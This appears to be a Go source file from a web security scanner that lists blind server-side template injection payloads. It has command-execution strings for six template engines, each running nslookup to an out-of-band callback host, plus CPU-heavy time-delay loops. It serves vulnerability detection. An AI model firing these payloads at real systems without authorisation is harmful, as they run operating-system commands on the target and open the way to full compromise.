package ssti_blind

// sstiOASTPayload defines a template injection payload that triggers an OAST callback.
// The %s placeholder is replaced with the OAST URL.
type sstiOASTPayload struct {
	engine   string
	template string // %s placeholder for OAST URL
}

// sstiTimePayload defines a template injection payload pair for time-delay detection.
type sstiTimePayload struct {
	engine   string
	slowExpr string
	fastExpr string
}

// oastPayloads are OAST-based SSTI payloads that trigger DNS lookups.
var oastPayloads = []sstiOASTPayload{
	{engine: "jinja2", template: "{{config.__class__.__init__.__globals__['os'].popen('nslookup %s').read()}}"},
	{engine: "mako", template: "${__import__('os').popen('nslookup %s').read()}"},
	{engine: "freemarker", template: `${"freemarker.template.utility.Execute"?new()("nslookup %s")}`},
	{engine: "erb", template: "<%=`nslookup %s`%>"},
	{engine: "ejs", template: "<%%= require('child_process').execSync('nslookup %s') %%>"},
	{engine: "pebble", template: "{%% set cmd = 'nslookup %s' %%}{%% set runtime = beans.get('runtime') %%}{{ runtime.exec(cmd) }}"},
}

// timePayloads are time-delay based SSTI payloads.
//
// Iteration counts are sized to reliably produce > slowMinDuration (6s) on
// modern server hardware. They only run if the template engine actually
// evaluates them (i.e. the endpoint is vulnerable), so non-vulnerable
// targets see no extra load — the payload appears as raw text.
var timePayloads = []sstiTimePayload{
	{engine: "jinja2", slowExpr: "{%for x in range(50000000)%}{%endfor%}", fastExpr: "{%for x in range(1)%}{%endfor%}"},
	{engine: "twig", slowExpr: "{%for x in 1..50000000%}{%endfor%}", fastExpr: "{%for x in 1..1%}{%endfor%}"},
	{engine: "mako", slowExpr: "${sum(range(50000000))}", fastExpr: "${sum(range(1))}"},
	{engine: "erb", slowExpr: "<%50000000.times{}%>", fastExpr: "<%1.times{}%>"},
	{engine: "freemarker", slowExpr: "<#list 1..50000000 as x></#list>", fastExpr: "<#list 1..1 as x></#list>"},
}
